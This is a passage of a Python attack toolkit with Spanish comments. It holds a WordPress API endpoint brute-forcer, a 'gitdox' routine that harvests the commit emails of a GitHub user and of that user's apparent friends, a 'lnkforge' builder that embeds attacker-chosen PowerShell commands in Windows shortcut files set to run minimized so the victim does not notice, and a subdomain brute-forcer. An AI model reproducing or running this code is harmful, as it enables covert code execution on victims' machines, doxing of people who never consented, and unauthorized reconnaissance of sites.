    if train_use == True:
        crint("[TRAINING MODE] Los recursos se demoraran en cargar =>> train__")
        train__ = []

    # wordpress(https://example/, dic or )
    apis_Wordpress = []
    all_Wordpress_api = []
    history_list = []

    error_codes = {

        200: "Publica",
        400: "Mal formada",
        401: "Requiere autenticacion",
        403: "Sin permisos suficientes",
        404: "No funcional",
        500: "Error interno"

    }

    # Codigos de errores en las web pages
    any_st = [200, 400, 401, 403]

    # Variable que maneja de como se almacenan los endpoints en diferentes versiones de wordpress
    versions_ = ["href", "self"]

    # Obtenemos las urls a los endpoints y las almacenamos en una variable global en caso de ser necesario
    # Si no se retorna como lista para su uso a estimar
    def url_automatic(my_dir_json_var, global_ = True):

        bored_json = str(my_dir_json_var).split(",")
        my_urls = []
        
        for line in bored_json:

            try:
                for vrs in versions_:
                
                    # Si alguno de esto coincide, se obtiene los enlaces
                    if vrs in line and "://" in line and f"{vrs}=" not in line:
                        
                        url = line.split("'")
                        url = url[url.index(vrs)+2]

                        if url not in apis_Wordpress and global_ == True:
                            apis_Wordpress.append(url)
                        
                        if url not in apis_Wordpress and global_ == False:
                            my_urls.append(url)

            except:
                pass
        
        if global_ == False:
            return my_urls

    # Guardamos los endpoints en un archivo llamado wp-urls
    def save_wp_file():
        apis_Wordpress.sort()
        with open("wp-urls.txt", "w", encoding="utf-8") as save_:
            
            for url_to_save in apis_Wordpress:
                save_.write(url_to_save+"\n")

        crint("[INFO] Endpoints guardados en =>> [wp-urls.txt]")

    # Si el usuario no incluye el / del final se le agrega
    if url.endswith("/") == False:
        url = url+"/"

    # Si el usuario escribio la url sin el formato adecuado
    if "://" not in url:
        crint("[ERROR] No ingresaste la url con el formato solicitado: https://example.com/")
        return

    # Si el usuario quiere buscar plugins por fuerza bruta
    if brute == "dic":

        # Se leeran los plugins mas probables
        with open(assets_, "r", encoding="utf-8") as read_:

            all_lines = read_.readlines()

            # Definimos la funcion que usaremos en el threadpoolexecutor
            def multi_dic(line):
                
                plug_ = line.strip()
                line = url+"wp-json/"+plug_

                try:

                    force_get = requests.get(line)
                    srint(f"[INFO] Probando plugin {plug_} =>> [{force_get.status_code}]")

                    # Si el plugin existe, se agrega a la lista
                    if any(force_get.status_code == st_x for st_x in any_st) and "<html" not in force_get.text:
                        apis_Wordpress.append(force_get.url)

                except KeyboardInterrupt:
                    save_wp_file()
                    return

                except:
                    pass
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as dic_force:
                dic_force.map(multi_dic, all_lines)
            
        # Guardamos las apis encontradas
        if apis_Wordpress != []:
            save_wp_file()
            return

        else:
            crint("\n[INFO] No se lograron encontrar Endpoints ...")

    # Si el usuario quiere buscar por wp-json
    if brute != "dic":

        try:
            normal_url= url+"wp-json"
            slash_url= url+"wp-json/"

            try:
                wp_json = requests.get(normal_url)
            except:
                pass

            if wp_json.status_code != 200 or "<html" in wp_json.text:
                crint("[ERROR] No se logro encontrar el archivo WordPress de JSON ...")
                return
            
            wp_json_ct = json.loads(wp_json.content)
            
            # Se agrega a historial de apis para evitar bucle de scaneo
            history_list.append(wp_json.url)

            if "namespaces" not in wp_json_ct:
                crint("[ERROR] No se logro encontrar la configuracion de WordPress ...")
                return
            
            crint("[INFO] Configuracion de WordPress encontrada =>> [OK]")
            
            # Se obtienen los plugins que estan expuestos en la web
            for plugin in wp_json_ct["namespaces"]:
                apis_Wordpress.append(slash_url+plugin)
            
            # Luego por cada plugin se analiza para obtener sus subendpoints
            # EX METHOD for url_temp in apis_Wordpress:
            def multi_thread(url_temp):
            
                srint(f"[INFO] Analizando URL =>> [{url_temp}]")

                # Creamos una variable sin el plugin
                url_no_format = url_temp.split("/")

                #########################################
                # </> Machine learning
                #########################################
                if train_use == True:
                    cont = 1
                    histy = []
                    while True:

                        xdxd = url_no_format[url_no_format.index("wp-json")+cont]

                        if histy != []:
                            for xd_ in histy:
                                xdxd = xd_ + "/" + xdxd
                            histy.clear()

                        train = url+"wp-json/"+xdxd

                        test = requests.get(train)

                        if any(test.status_code == xd for xd in any_st) and "<html" not in test.text:

                            if xdxd not in train__:
                                train__.append(xdxd)
                            break

                        else:
                            histy.append(xdxd)

                        cont += 1

                #########################################

                url_no_format = url_no_format[url_no_format.index("wp-json")+1]
                url_no_format = url_temp.replace("/"+url_no_format, "")
                
                # Este bloque se encarga de verificar los plugins con sus endpoints completas.
                # Es decir, tratar de obtener todas directamente
                try:

                    # Si la url no se escaneo se obtiene el contenido
                    if url_no_format not in history_list:
                        test_all_plug = requests.get(url_no_format)

                    # Si se encuentra plugin se continua con el escaneo
                    if test_all_plug.status_code == 200:
                    
                        # Si se encuentra se obtiene todos los endpoints y se agregan a la variable
                        try:

                            history_list.append(url_no_format)
                            get_json = json.loads(test_all_plug.content)

                            for url_get in url_automatic(get_json, False):

                                if url_get not in all_Wordpress_api:
                                    all_Wordpress_api.append(url_get)

                        except:
                            pass

                except KeyboardInterrupt:
                    save_wp_file()
                    return

                except:
                    pass
                
                try:
                    my_query = requests.get(url_temp)

                    # Se intenta obtener los endpoints de cada plugin
                    try:
                        get_json = json.loads(my_query.content)

                        # Si todo sale bien se deberian de almacenar en la variable global
                        for url_jsoned in url_automatic(get_json, False):

                            if url_jsoned not in all_Wordpress_api:
                                all_Wordpress_api.append(url_jsoned)

                    except:
                        pass

                except KeyboardInterrupt:
                    save_wp_file()
                    return

                except:
                    pass
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as multi_process_execute:
                multi_process_execute.map(multi_thread, apis_Wordpress)

            # EX METHOD all_Wordpress_api.pop(0)

            # Agregamos las urls encontradas a la lista global 
            url_automatic(wp_json_ct, True)
            for url_dup in all_Wordpress_api:

                if url_dup not in apis_Wordpress:
                    apis_Wordpress.append(url_dup)

            # Guardamos los endpoints en un archivo llamado wp-urls
            save_wp_file()

            ############ </> dev zone ###########################

            if train_use == True:
                with open(assets_, "a+", encoding="utf-8") as trine_:
                    
                    trine_.seek(0)
                    buff_ = trine_.read()

                    for url_train in train__:
                        if url_train+"\n" not in buff_:
                            trine_.write(url_train+"\n")

            #####################################################

        except KeyboardInterrupt:
            save_wp_file()
            return

        except Exception as err:
            crint(f"[ERROR] {err}")
            pass
    
    # Check multi hilo
    if check == "check":
        crint("[INFO] Iniciando verificacion de Endpoints =>> [OK]")
        
        # Definimos la funcion encargada de enviar las solicitudes y realizar
        # El proceso de obtencion de los enlaces de los Endpoints
        def requests_wh(url):

            try:
                
                multi_ = requests.get(url)
                srint(f"[INFO] API_REST {error_codes[multi_.status_code]} =>> [{url}]")

                # Si el codigo es aceptable y la resuesta no trae una lista vacia se retorna la lista
                if any(multi_.status_code == st_cd for st_cd in any_st) and multi_.text.startswith("[]") == False:
                    return url_automatic(json.loads(multi_.content), False)
            
            except:
                pass
        
        try:

            # Mientras tengamos la ejecucion por hilos se le asignara a cada elemnto de la lista
            # la funcion requests_wh hasta un maximo de 10 veces
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executes_:
                
                # Luego cuando se obtienen los resultados se transforman a una lista
                apis_multi_pool = list(executes_.map(requests_wh, apis_Wordpress))

            # Por cada elemno de esta lista si no esta repetido y es difrente de None
            # Se agregan todos los elementos de esta misma a la lista general de endpoints
            for pool_url in apis_multi_pool:

                try:
                    if pool_url not in apis_Wordpress and pool_url != None:
                        apis_Wordpress.extend(pool_url)
                except:
                    pass
            
            # Finalmente se eliminan los elementos repetidos con set() y volviendo a transformarlo en una lista con list()
            apis_Wordpress = list(set(apis_Wordpress))
            save_wp_file()

            crint(f"[INFO] Se han verificado {len(apis_Wordpress)} Endpoints ...")

        except Exception as err:
            crint(f"[ERROR] {err}")

def gitdox(user_ = "test", scan_type_ = "normal"):

    profile_ = {} # Informacion del perfil principal
    profile_commits = [] # Variable para almacenar los usuarios que han hecho commits [NOMBRE, EMAIL]
    matchs_profiles = [] # Usuarios que posiblemente interactuan con el
    save_emails = {} # Variable encargada de almacenar los emails asignados en busquedas profundas

    my_repo_list = [] # Variable de repositorios para iterar en threads

    # Funcion encargada de guardar los resultados
    def save_results():
        my_save_ = ""

        if profile_ != {}:
            my_save_ = my_save_ + "---------------PROFILE-INFO---------------\n"
            for key_ in profile_.keys():
                my_save_ = my_save_ + f"[{key_.upper()}] =>> [{profile_[key_]}]\n"
            
        if profile_commits != []:

            my_save_ = my_save_ + "-------------NAMES-&-EMAILS---------------\n"
            for block in profile_commits:
                my_save_ = my_save_ + f"[{block[0]}] =>> [{block[1]}]\n"
        
        if matchs_profiles != []:

            my_save_ = my_save_ + "-------------FRIENDS-POSIBLES-------------\n"
            for match_ in matchs_profiles:
                my_save_ = my_save_ + f"[USUARIO] {match_} =>> [MATCH]\n"
        
        if scan_type_ != "normal" and save_emails != {}:

            for user_iter in save_emails.keys():
                my_save_ = my_save_ + f"------------------------------------------\n"
                my_save_ = my_save_ + tabulate(save_emails[user_iter], headers=[user_iter.upper(), "EMAIL"])+"\n"


        if my_save_ != "":
            with open(f"gitdox-{user_}.txt", "w", encoding="utf-8") as save_txt_:
                save_txt_.write(my_save_)
            
            crint(my_save_+f"------------------------------------------\n[PASS] Informacion guardada en =>> [gitdox-{user_}.txt]")
            
        else:
            crint(f"[INFO] No se logro encontrar informacion de el usuario {user_} ...")
        
    try:
        crint(f"[INFO] Iniciando busqueda para el usuario =>> [{user_}]")
        start_point = requests.get(f"https://api.github.com/users/{user_}", timeout=10)
        share_points = json.loads(start_point.content)
        
    except Exception as err:
        crint(f"[ERROR] {err}")
        return
    
    # Si el usuario no existe o hay problema de la api se termina el programa
    if start_point.status_code != 200 or "login" not in share_points:
        crint(f"[ERROR] Usuario {user_} no encontrado o API rest limitada =>> [{str(start_point.status_code)}]")
        return

    # Obtenemos los datos del usuario
    for key_util in share_points.keys():
        try:
            if "github" not in str(share_points[key_util]):
                profile_.setdefault(key_util, share_points[key_util])
        except:
            pass

    # Si es que hay repositorio obtenemos sus commits
    if share_points["public_repos"] != 0:

        # Intentamos obtener la lista de repositorios
        try:
            repost_points = requests.get(f"https://api.github.com/users/{user_}/repos", timeout=10)
            repost_share_points = json.loads(repost_points.content)

        except Exception as err:
            save_results()
            crint(f"[ERROR] {err}")
            return

        # Por cada posible nombre de repositorio obtenido se agrega a la array de: my repo list
        for posible_name in repost_share_points:
            try:
                if "url" in posible_name:
                    my_repo_list.append(posible_name["url"])
            except:
                pass
        
        # Obtenemos el historial de commit de cada repositorio
        def mail_requests(ulrs_array_repos):

            srint(f"[INFO] Analizando commits en =>> [{ulrs_array_repos.split('/')[5]}]")
            try:
                my_query = requests.get(ulrs_array_repos+"/commits", timeout=10)
                email_process = json.loads(my_query.content)

            except:
                return
            
            # Por cada seccion grande del json
            for block_json in email_process:
            
                # Intentamos obtener la seccion que contiene los detalles de los commits
                try:
                    only_names = block_json["commit"]["author"]
                    
                    # Si el paquete de nombre y email no esta en la lista de commits se obtienen y se guardan
                    if [only_names["name"], only_names["email"]] not in profile_commits:
                        profile_commits.append([only_names["name"], only_names["email"]])
                    
                except:
                    pass

        # En cada 10 hilos enviamos el proceso de identificar las url necesarias para el tema
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as threads_mails_get:
            threads_mails_get.map(mail_requests, my_repo_list)
    
    else:
        crint(f"[INFO] El usuario {user_} no tiene repositorios que mostrar ...")

    # Si es que hay seguidores y seguidos se obtienen los json correspondientes
    if profile_["following"] != 0 and profile_["followers"] != 0:
        
        # Intentamos obtener los seguidores y seguidos
        try:
            followings_query = requests.get(f"https://api.github.com/users/{user_}/following", timeout=10)
            followings_data = json.loads(followings_query.content)

            followers_query = requests.get(f"https://api.github.com/users/{user_}/followers", timeout=10)
            followers_list = followers_query.text

        except Exception as err:
            save_results()
            crint(f"[ERROR] {err}")
            return

        # Por cada seccion del json se obtiene el nombre de usuario y se verifica dentro del str que contiene followers
        for block in followings_data:

            try:
                # Si contiene se agrega a la array matchs profiles 
                if block["login"] in followers_list:
                    crint(f"[MATCH] Estos usuarios interactuan fuera de github: {block['login']}")
                    matchs_profiles.append(block["login"])
            except:
                pass
    
    else:
        crint(f"[INFO] Imposible determinar matchs con 0 followings ...")

    # Escaneo profundo de matchs
    if scan_type_ != "normal" and matchs_profiles != []:

        repos_asignados = []
        def scan_to_match_dox(urls_to):

            # Intentamos obtener el nombre de cada repositorio publico de cada usuario que es amigo del perfil
            # es decir que coincide en followers y following
            try:
                my_matchs_querys = requests.get(f"https://api.github.com/users/{urls_to}/repos")
                my_info_repos = json.loads(my_matchs_querys.content)

                # Si el contenido de la respuesta tiene menos de 10 caraceres o no carga correctamente se cierra la coneccion
                if len(my_matchs_querys.text) < 10 or my_matchs_querys.status_code != 200:
                    return
            except:
                return

            # Por cada bloque de los usuarios que estamos listando los repositorios, los obtenemos
            for block in my_info_repos:
                repos_asignados.append(block["full_name"])

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as scan_deep_th:
            scan_deep_th.map(scan_to_match_dox, matchs_profiles)

        # Si no se obtuvieron repositorios asignados a cada perfil, se termina
        if repos_asignados == []:
            save_results()
            return
        
        # Creamos una variable con una iteracion similar a any()
        # creando un diccionario con cada nombre de usuario en una key y con un array vacio
        save_emails = { username_: [] for username_ in matchs_profiles }
        
        def get_commits(emails_get):

            # Se intenta obtener el json de cada repositorio la variable del repositorio es emails_get
            try:
                commits_query = requests.get(f"https://api.github.com/repos/{emails_get}/commits")
                my_info_commits = json.loads(commits_query.content)

                if len(commits_query.text) < 10 or commits_query.status_code != 200:
                    return
            except:
                return
            
            # Por cada bloque del json que nos entrega la url de commits
            for block_json in my_info_commits:
                
                # Se intenta obtener la seccion especifica del commit y despues de autor
                try:
                    thrash_date = block_json["commit"]["author"] # Nombre y correo del commit con fecha
                    name_user = emails_get.split("/")[0] # Nombre del usuario a quien se esta escaneando
                    
                    # Luego si el email y el nombre no estan dentro de el diccionario se agrega
                    if [thrash_date["name"], thrash_date["email"]] not in save_emails[name_user]:
                        save_emails[name_user].append([thrash_date["name"], thrash_date["email"]])

                except:
                    pass
            
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as final_scan_:
            final_scan_.map(get_commits, repos_asignados)

    save_results()

def lnkforge():

    b64_assets = sht("assets/modular_lnk.b64")

    # Varaible que contiene los bytes a ocupar dentro del lnk 45 son las veces que se repite la cadena A9AD0APQ en el
    # base64 original, se genera de forma dinamica con la seccion de importar LNK propio
    try:
        with open(".cfg_lnk", "r", encoding="utf-8") as read_json:
            
            all_json = json.loads(read_json.read())
            b64_extra_bytes = all_json["bytes_prev"] + all_json["target_"]*all_json["count_target"] + all_json["bytes_next"]

    except:
        b64_extra_bytes = "ACAAIgAg"+"AD0APQA9"*45+"AD0APQAgACI"


    # Varibale que limita el relleno de bytes
    max_bytes = len(b64_extra_bytes)
    buffer_ = ""

    # Diccionario encargado de traducir el tipo de lnk a lineas especificadas en el archivo b64
    json_lines = {

        "normal": 0,
        "minimal": 1,

        "normal-icon": 2,
        "minimal-icon" :3

    }

    # Variable tendra el valor de normal si no se usa el minimal
    line_ = json_lines["normal"]

    def settings_lnk():

        # Ingresamos el tipo de lnk a modificar
        try:
            crint(""":: LNKFORGE :: =>> [INFO]
:: Estas en la ejecucion de ajustes de lnkforge, escribe una de estas opciones ::
:: para editar la opcion correspondiente a tu eleccion ::

    :: Opciones ::
    
    > minimal
    minimal-icon

    > normal
    normal-icon     
""")

            while True:

                my_lnk_edit = input("cmd_lnk_settings >> ")

                if my_lnk_edit not in json_lines:
                    crint(f"[INFO] No existe ningun LNK asociado a {my_lnk_edit} =>> [BAD]")
                    continue
                
                if my_lnk_edit == "exit":
                    return
                
                crint(f"[ALERT] LNK file switched to {my_lnk_edit.upper()} =>> [OK]")

                my_lnk = json_lines[my_lnk_edit]
                my_new_lnk = input(f"{my_lnk_edit}_new_file_path >> ")

                break
        
        except KeyboardInterrupt:
            return

        except Exception as err:
            crint(f"[ERROR] {err}")
            return

        try:
            with open(my_new_lnk, "rb") as lnk_to_encode:#, open(b64_assets, "w", encoding="utf-8") as save_line_in_modular:

                all_bytes = lnk_to_encode.read()
                encoded_lnk = base64.b64encode(all_bytes).decode().replace("=", "")

        except Exception as err:
            crint(f"[ERROR] {err}")

        # Posibles firmas que representan el inicio del payload (comillas de apertura en base64)
        bytes_prev_pos = ["ACAAIgAg", "ACIAIA"]

        # Fragmentos que forman parte del bloque de padding en base64 (varias formas de '====')
        sing_ = ["AD0", "APQ", "A9"]

        # Lista temporal para almacenar las posiciones donde aparece cada fragmento en el texto
        to_num = []

        sum = 0

        try:
            # Obtenemos la posición de aparición de cada fragmento en el texto base64
            for ele in sing_:
                to_num.append(encoded_lnk.index(ele))

            # Determinamos cuál aparece primero (el de menor índice)
            trunc_ = min(to_num)

            # Extraemos 8 caracteres desde la posición del fragmento más cercano al inicio
            target_ = encoded_lnk[trunc_:trunc_+8]

            # Contamos cuántas veces se repite esa secuencia completa
            count_target = encoded_lnk.count(target_)

            # Dividimos el texto en dos partes, antes y después del bloque de padding repetido
            two_list_b64 = encoded_lnk.split(target_ * count_target)

            # Obtenemos los últimos 19 caracteres antes del bloque de padding (zona de apertura del payload)
            bytes_prev = two_list_b64[0][-19:]

            # Guardamos los bytes previos en una variable de cache para evitar problemas
            bytes_prev_cache = bytes_prev

            # Buscamos cuál de las firmas conocidas está presente en esa zona
            for elem in bytes_prev_pos:
                if elem in bytes_prev:
                    bytes_prev = elem
                    break

            if bytes_prev == bytes_prev_cache:
                print("[INFO] No se logro definir el inicio del PayLoad =>> [BAD]")
                return
            # Obtenemos los primeros 19 caracteres después del bloque (zona de cierre del payload)
            bytes_next = two_list_b64[1][:11]

            # Creamos una lista para guardar los fragmentos encontrados y su posición en el cierre
            previus_order_chain = []

            # Recorremos los posibles fragmentos para encontrar cuáles aparecen en la zona de cierre
            for byte_ in sing_:

                if byte_ in bytes_next:
                
                    tem_index = bytes_next.index(byte_)
                    previus_order_chain.append([byte_, tem_index])
                    bytes_next = bytes_next.replace(byte_, "")  # Eliminamos la ocurrencia

            if previus_order_chain == []:
                crint("[INFO] No se logro definir el final del PayLoad =>> [BAD]")
                return

            # Ordenamos los fragmentos según su posición
            previus_order_chain.sort()
            str_previus = ""

            # Unimos los fragmentos en una sola cadena
            for elem in previus_order_chain:
                str_previus = str_previus + elem[0]

            # Mostramos los resultados del análisis
            print(f"""
        ---------------------
-----------INFORME-DE-CONVERSION-----------
        ---------------------
:: Inicio de carga del Payload: {bytes_prev}
:: Cadena de bytes vacíos: {target_} x {count_target}
:: Previa final de carga: {str_previus}
:: Final de carga de payload: {bytes_next}
-------------------------------------------""")

            # Contamos cuántas veces aparece cada tipo de fragmento
            for elem in sing_:
                sum = sum + encoded_lnk.count(elem)

            crint(f"[INFO] Total de caracteres permitidos =>> [{sum}]")

            # Reconstruimos el payload para su verificación o análisis
            total_str = bytes_prev + target_ * count_target + str_previus + bytes_next

            # Verificamos si el payload reconstruido existe en el texto base64
            if total_str not in encoded_lnk:
                crint("[INFO] Formato incorrecto =>> [BAD]")
                return

            # Guardamos la configuracion del base64 en json
            with open(".cfg_lnk", "w", encoding="utf-8") as write_json:

                save_json = {
                    
                    "bytes_prev": bytes_prev,
                    "target_": target_,
                    "count_target": count_target,
                    "bytes_next": str_previus+bytes_next
                }

                write_json.write(str(save_json).replace("'", '"'))

                crint("[INFO] Configuracion generada guardada en =>> [.cfg_lnk]")

            try:
                with open(b64_assets, "r", encoding="utf-8") as read_:

                    # Leemos todas las líneas del archivo
                    file_all = read_.readlines()

                    # Reemplazamos la linea que el usuario quiere personalizar
                    file_all[my_lnk] = encoded_lnk

                # Abrimos el archivo nuevamente para reescribir la informacion con las lineas nuevas
                with open(b64_assets, "w", encoding="utf-8") as write_save:
                    write_save.writelines(file_all)
                
                crint("[INFO] Formato correcto y guardado en modular_lnk.b64 =>> [OK]")

            except Exception as err:
                crint(f"[ERROR] {err}")

        except Exception as err:
            crint(f"[ERROR] {err}")

    """
    :: INFORMACION GENERAL ::

    La variable b64_extra_bytes contiene un base64, que decodificandolo en UTF-16BE da como resultado
    " ================================ "
    Esto dentro del lnk, a la hora de crearlos, genera espacio dentro del propio programa, es decir
    la memoria total que carga consigo dentro el lnk. Si no genero el espacio suficiente dentro de este "relleno" por asi decirlo,
    los comandos se cortaran justo con el limitante de bytes necesarios para ejecutar. 

    Por ejemplo, use los siguientes comandos en el programa:

    - ls
    - pause
    - pwd
    - systeminfo

    Sin embargo, el lnk original del base64 que estamos usando solo contiene:

    - ls
    - pause

    Lo que signifca que los siguientes comandos si bien pueden ejecutarse, se quedaran a la mitad
    debido a la limitante de bytes en el formato original del LNK. Para evitar eso generamos un nuevo
    lnk que ejecute powershell.

    :: CREACION DEL ACCESO_DIRECTO.LNK PARA DEVS :: 

    Para hacer mas creible el acceso directo se puede usar un template creado desde windows con estas
    caracteristicas sin embargo se corrompe tras irrumpir la estructura original del LNK:

    - Ruta del acceso directo: C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command " ========================================================================================================================================= "
    - Icono a escoger
    - Pantalla: Minimizada (Para que no se vea al ejecutarse)

    Luego con wsl o pasando el archivo a WSL con base 64 ejecutamos el siguiente comando:
    - base64 nombre.lnk > temp.txt

    Una vez codificado a base64 necesitamos eliminar todos los saltos de linea del base64.
    Copiamos el contenido del temp.txt y lo pegamos en: https://pinetools.com/es/eliminar-saltos-linea

    Una vez limpiado, este archivo nos servira para ser utilizado en esta herramienta. Esto se hace
    reemplazando el archivo original del template.

    Eres libre de experimentar con el tamaño maximo de bytes que aceptan estos LNK corruptos desde Linux.
    Digo "corruptos" porque siguen siendo funcionales a pesar de su modificacion tan "casera" hasta el momento
    la sentencia mas larga es esta la cual consta de 137 caracteres que codificados a UTF-16BE son 274 bytes.

    LNK desde windows, tiene un limite mayor al que se refiere en la interfaz grafica. Es decir
    que si yo coloco muchos ======================================= " y haya terminado bien
    con '= "' en el codigo base64 no se ve reflejado que este completo a pesar de tener cambios
    como por ejemplo en extrabytes normal.

    AD0: ES =
    AD0APQ: ES ==
    AD0APQA9: ES ===

    !! "=" Esta codificado a UTF-16BE !!

    Esta informacion es crucial para lograr comprender la estructura de donde se encuentra la cadena
    a reemplazar por comandos embebidos.
    """

    crint(""":: LNKFORGE :: =>> [INFO]
:: Todo lo que escribas a continuacion quedara guardado como acceso directo ::
:: estos comandos se ejecutaran cuando abran el LNK dentro de la maquina ::

    > minimal      :: La ventana de comandos se ejecutara en minimizado.
    minimal-icon :: LNK minimizado con icono.

    > normal       :: La ventana de comandos se ejecutara en primer plano.
    normal-icon  :: LNK en primer plano con icono.

    :: ADD PERSONAL .LNK :: </>
    
    > personal-lnk :: Agrega tu LNK personalizado desde Windows.
""")

    # Funcion encargada de devolver la longitud del b64 de los comandos, o codificada a base64 si lleva False
    def check_len_or_save(commands_code, check_ = True):

        # Se le agregan las comillas dobles para que internamente el lnk valide -Command " buffer_ "
        total_commands = f' " {commands_code} " '
        var_return = base64.b64encode(total_commands.encode("UTF-16BE")).decode()
        
        # Si queremos obtener la cadena en base64, para evitar errores de ejecucion de codigo no aceptado en powershell
        # Reemplazamos el final de la cadena por un "#" para asi comentar el resto de comandos o caracteres corruptos
        if not check_:
            total_commands = total_commands.replace('; " ', ';#" ')

        if check_:
            return len(var_return)
        
        return var_return

    # Entramos en un bulce que almacene el historial de comandos a ejecutar
    while True:

        try:
            commands_ = input("cmd_lnk_executor >> ")

            # Si el comando es exit termina el bucle
            if commands_ == "exit":
                break

            if commands_ == "personal-lnk":
                settings_lnk()
            
            # Si el atacante quiere que no se vea la ejecucion en powershell se marca como True
            # y se salta esta iteracion
            if commands_ in json_lines:
                crint(f"[ALERT] LNK file switched to {commands_.upper()} =>> [OK]")
                line_ = json_lines[commands_]
                continue

            # El historial de comandos a ejecutar separados por un ;
            buffer_ = buffer_ + commands_+";"

            if max_bytes <= check_len_or_save(buffer_, True):
                crint(f"[INFO] Limites de {str(max_bytes)} bytes maximos excedidos en LNK =>> [SAVE]")

                # Creamos una lista con los comandos a ejecutar y obtenemos el ultimo comando agregado y lo reemplazamos del str
                buffer_tmp = buffer_.split(";")
                delete_command_out_bytes = buffer_tmp[len(buffer_tmp)-2]+";"

                buffer_ = buffer_.replace(delete_command_out_bytes, "")
                break
        
        except KeyboardInterrupt:
            return

        except Exception as err:
            crint(f"[ERROR] {err}")

    try:
        # Se obtiene la fecha y se da nombre al lnk si es que se guarda con el año el dia y minuto
        date_ = time.localtime()
        name_file_save = f"lnk_forged_{date_[0]}-{date_[2]}-{date_[4]}.lnk"

        # Se codifica el texto en UTF-16BE formato usado en powershell, para luego codificarlo a b64
        # y transformarlo a str con .decode ( porque es binario )
        code_ = check_len_or_save(buffer_, False)

        # Abrimos el archivo base de powershell que estamos usando para reemplazar la cadena b64_extra_bytes por el codigo 
        # en base64 de la variable code_, la cual contiene el codigo embebido a ejecutar
        with open(b64_assets, "r", encoding="utf-8") as read_ps_b64, open(name_file_save, "wb") as save_bytes_lnk:

            file_lines = read_ps_b64.readlines()[line_]

            # Aqui se obtiene el valor del diccionario, es decir que ocuparan por ejemplo: 0 para normal y 1 para ps minimizado
            all_b64 = file_lines.replace(b64_extra_bytes, code_).replace("=", "").strip()

            # Si el resto de la division de la cantidad total de caracteres del archivo 
            # tiene un resto, se debe de igualar la cadena con "=" dependiendo del caso
            for i in range(10):

                rest_ = len(all_b64) % 4

                if rest_ == 2:
                    all_b64 = all_b64+"=="

                if rest_ == 3 or rest_ == 1:
                    all_b64 = all_b64+"="

                # Intentamos decodifciar el base64
                try:
                    base64.b64decode(all_b64)

                # Si nos da error, aumentamos el buffer para codificarlo de vuelta a base64 y asi
                # modificar tambien el padding hasta que coincida correctamente para decodificar
                except:
                    buffer_ = " " + buffer_
                    code_ = check_len_or_save(buffer_, False)
                    all_b64 = file_lines.replace(b64_extra_bytes, code_).replace("=", "").strip()
                
                # Si todo sale bien, se termina
                else:
                    break

            # Y se guarda el archivo lnk en binario
            save_bytes_lnk.write(base64.b64decode(all_b64))

            crint(f"""
        ---------------------
-----------INFORME-DE-CONVERSION-----------
        ---------------------
:: Tamaño en txt original: {len(all_b64)}
:: Resto original: {rest_}
-------------------------------------------
:: Tamaño en txt ajustado: {len(all_b64)}
:: Resto resultante: {len(all_b64) % 4}
-------------------------------------------
[INFO] LNK guardado como {name_file_save} =>> [OK]""")

    except Exception as err:
        crint(f"[ERROR] {err}")

def domainforce(url_ = "https://example.com", dic_ = None):

    # Si el usuario quiere usar un diccionario propio
    if dic_ != None:
        
        # Lo intentamos abrir y si existe continuamos con la ejecucion
        try:
            with open(dic_, "r", encoding="utf-8") as try_:
                pass
        
        # Si no existe usamos el diccionario que tenemos en assets
        except:
            crint(f"[ERROR] Diccionario no encontrado en la ruta: {dic_}\n[INFO] Dictionary changed to preset =>> [OK]")
            dic_ = sht("assets/subdomain_dict.txt")
    
    else:
        # Si no se especifica diccionario se usa el preedefinido
        dic_ = sht("assets/subdomain_dict.txt")

    # Lista donde se almacenarán los subdominios encontrados exitosamente
    match_ = []

    # Lista de prefijos y esquemas que se eliminarán del dominio ingresado
    not_in_my_url = ["www.", "https://", "http://", "ftp://", "sftp://"]

    # Función que intentará acceder a un subdominio y guardarlo si responde correctamente
    def concurrent_scr_test(url):

        # Construye la URL con el subdominio, el esquema (http/https) y el dominio base
        url = my_type_ssl + url.strip() + "." + url_

        # Intenta hacer una solicitud HTTP al subdominio
        try:
            intent_ = requests.get(url, timeout=10)
        except:
            # Si ocurre un error (como timeout o conexión fallida), se ignora
            srint(f"[ERROR] Subdominio no encontrado =>> [{url}]")
            return

        # Si el servidor no responde con un estado 200 (OK), se informa como error
        if intent_.status_code != 200:
            srint(f"[ERROR] Subdominio no encontrado =>> [{url}]")
            return
        
        # Si la URL ya esta dentro de los matchs se salta la iteracion
        if url in match_:
            return
        
        # Si el subdominio responde correctamente, se informa como encontrado
        srint(f"[INFO] Subdominio encontrado =>> [{url}]")

        # Se agrega el subdominio a la lista de coincidencias
        match_.append([url])

    # Verifica que la URL ingresada tenga un esquema válido (ej: https://)
    if "://" not in url_:
        crint(f"[ERROR] El dominio ingresado no tiene formato valido. Ejemplo: https://example.com")
        return

    # Elimina de la URL los esquemas y prefijos no deseados
    for elem in not_in_my_url:

        # Si encuentra un esquema válido en la URL, lo guarda
        if elem in url_ and "://" in elem:
            my_type_ssl = elem

        # Elimina el esquema o prefijo encontrado
        url_ = url_.replace(elem, "")

    # Separa y conserva solo el dominio principal (quita rutas como /pagina)
    url_ = url_.split("/")[0]

    # Abre el archivo de diccionario de subdominios y usa hilos para probar cada uno
    with open(dic_, "r", encoding="utf-8") as read_, concurrent.futures.ThreadPoolExecutor(max_workers=10) as th_work:

        # Lee todas las líneas (subdominios) del archivo
        read_r = read_.readlines()

        # Ejecuta la función para cada subdominio en paralelo con hasta 10 hilos
        th_work.map(concurrent_scr_test, read_r)

    # Si hay elemntos en la lista se guardan en un txt y se muestran en pantalla
    if match_:
        print("\n\n" + tabulate(match_, ["URLS GET"]))
        
        with open("saved_subdomain.txt", "w", encoding="utf-8") as save_:
            for elem in match_:
                try:
                    save_.write(elem[0]+"\n")
                except:
                    pass

        crint("\n[INFO] Resultados guardados en =>> [saved_subdomain.txt]")

    else:
        crint("\n\n[ERROR] No se lograron encontrar subdominios =>> [BAD]")

################################################
# CREACION DE JSON PARA OPTIMIZACION EN FSH.PY #
################################################
#           MODULAR LAS HERRAMIENTAS           #
################################################